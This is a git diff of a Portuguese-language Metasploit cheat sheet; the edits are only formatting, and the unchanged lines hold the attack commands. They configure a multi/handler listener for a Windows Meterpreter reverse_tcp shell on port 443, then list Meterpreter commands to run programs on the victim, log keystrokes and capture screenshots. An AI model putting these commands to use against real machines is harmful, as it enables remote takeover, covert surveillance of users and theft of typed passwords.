@@ -11,6 +11,7 @@ date: 2016-07-12T14:54:44.000Z
 
 -Comandos para configurar o modo Listening:
 ```
+
 msfconsole
 
 use exploit/multi/handler
@@ -20,8 +21,8 @@ set payload windows/meterpreter/reverse_tcp
 set lhost (Seu IP)
 
 set lport 443
-```
 
+```
 exploit
 
 -Comando manutenção de acesso:
@@ -49,12 +50,13 @@ Obter shell:
 Executar um programa:
 ```execute -f calc.exe```
 
-Keylogger.
-```
+Keylogger:
+ 
+ ```
 meterpreter > keyscan_start INICIA O KEYLOGGER
 meterpreter > keyscan_dump EXIBE AS TECLAS DIGITADAS
 meterpreter > keyscan_stop FINALIZA O KEYLOGGER
-```
+ ```
 Captura de tela.
 
 ```meterpreter > screenshot```
